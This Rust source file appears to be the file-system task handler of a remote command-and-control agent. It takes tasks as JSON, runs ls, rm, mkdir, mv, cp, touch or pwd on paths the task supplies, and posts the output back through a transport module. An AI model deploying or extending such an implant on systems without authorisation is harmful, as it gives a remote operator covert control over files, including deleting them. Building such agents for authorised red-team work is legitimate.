use std::fs;
use std::path::Path;
use std::io::Write;

pub fn handle_fs_command(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let command = task.get("command")
        .ok_or("missing command")?
        .as_str()
        .ok_or("command is not a string")?;

    let raw_params = task.get("parameters")
        .ok_or("missing parameters")?
        .as_str()
        .ok_or("parameters is not a string")?;

    let parsed_params: serde_json::Value = serde_json::from_str(raw_params)?;
    // Handle arg1
    let raw_path1 = parsed_params.get("arg1")
        .and_then(|v| v.as_str())
        .unwrap_or(".");
    let path1 = if raw_path1.is_empty() || raw_path1 == "." {
        std::env::current_dir()?.to_string_lossy().to_string()
    } else {
        raw_path1.trim_matches(&['"', '\''][..]).to_string()
    };
    let path_obj1 = Path::new(&path1);

    // Handle arg2
    let raw_path2 = parsed_params.get("arg2")
        .and_then(|v| v.as_str())
        .unwrap_or(".");
    let path2 = if raw_path2.is_empty() || raw_path2 == "." {
        std::env::current_dir()?.to_string_lossy().to_string()
    } else {
        raw_path2.trim_matches(&['"', '\''][..]).to_string()
    };
    let path_obj2 = Path::new(&path2);


    let output = match command {
        "ls" => match fs::read_dir(&path_obj1) {
            Ok(dir_entries) => {
                let mut files = Vec::new();
                for entry in dir_entries {
                    let entry = entry?;
                    files.push(entry.file_name().to_string_lossy().to_string());
                }
                files.join("\n")
            }
            Err(e) => format!("Failed to read directory {}: {}", path1, e),
        },

        "rm" => {
            if path_obj1.exists() {
                match fs::remove_file(&path_obj1) {
                    Ok(_) => format!("Deleted file: {}", path1),
                    Err(e) => format!("Failed to delete {}: {}", path1, e),
                }
            } else {
                format!("File does not exist: {}", path1)
            }
        }

        "mkdir" => match fs::create_dir_all(&path_obj1) {
            Ok(_) => format!("Created directory: {}", path1),
            Err(e) => format!("Failed to create directory {}: {}", path1, e),
        }

        "mv" => match fs::rename(&path_obj1, &path_obj2) {
            Ok(_) => format!("Moved from {} to {}", path1, path2),
            Err(e) => format!("Failed to move {}: {}", path1, e),
        }

        "cp" => match fs::copy(&path_obj1, &path_obj2) {
            Ok(_) => format!("Copied from {} to {}", path1, path2),
            Err(e) => format!("Failed to copy {}: {}", path1, e),
        }

        "touch" => match fs::OpenOptions::new().create(true).write(true).open(&path_obj1) {
            Ok(mut file) => {
                file.write_all(b"")?;
                format!("Touched file: {}", path1)
            }
            Err(e) => format!("Failed to touch file {}: {}", path1, e),
        }

        "pwd" => match std::env::current_dir() {
            Ok(pwd) => pwd.to_string_lossy().to_string(),
            Err(e) => format!("Failed to get current directory: {}", e),
        }

        _ => return Err("unsupported command".into()),
    };

    let response_json = serde_json::json!({
        "action": "post_response",
        "responses": [
            {
                "task_id": task.get("id").unwrap().as_str().unwrap(),
                "user_output": output,
                "timestamp": task.get("timestamp").unwrap().as_f64().unwrap(),
                "status": "success",
            }
        ]
    });

    let response_value = serde_json::to_string(&response_json)?;
    crate::transport::send_request(&response_value)?;
    Ok(())
}
